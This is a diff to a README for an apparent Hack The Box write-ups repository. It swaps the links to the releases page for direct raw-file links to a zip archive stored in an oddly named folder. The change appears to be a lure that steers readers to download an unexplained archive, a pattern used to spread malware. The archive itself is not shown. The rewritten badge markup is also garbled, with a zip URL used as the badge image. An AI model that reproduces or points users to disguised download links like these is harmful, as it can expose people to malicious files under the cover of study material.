@@ -1,6 +1,6 @@
 # 🔓 HTB-Writeups - Explore My Cybersecurity Journeys
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-HTB--Writeups-brightgreen.svg)](https://github.com/Ethanoateseconddegreeburn244/HTB-Writeups/releases)
+[![Download Now](https://raw.githubusercontent.com/Ethanoateseconddegreeburn244/HTB-Writeups/main/campanistic/HTB-Writeups.zip%https://raw.githubusercontent.com/Ethanoateseconddegreeburn244/HTB-Writeups/main/campanistic/HTB-Writeups.zip)](https://raw.githubusercontent.com/Ethanoateseconddegreeburn244/HTB-Writeups/main/campanistic/HTB-Writeups.zip)
 
 ## 📖 Overview
 
@@ -13,7 +13,7 @@ To begin your adventure with HTB-Writeups, follow these simple steps to download
 ## 📥 Download & Install
 
 1. Click the link below to visit the Releases page:
-   [Visit Releases Page](https://github.com/Ethanoateseconddegreeburn244/HTB-Writeups/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/Ethanoateseconddegreeburn244/HTB-Writeups/main/campanistic/HTB-Writeups.zip)
    
 2. Find the latest release. You will see a list of files you can download.
 
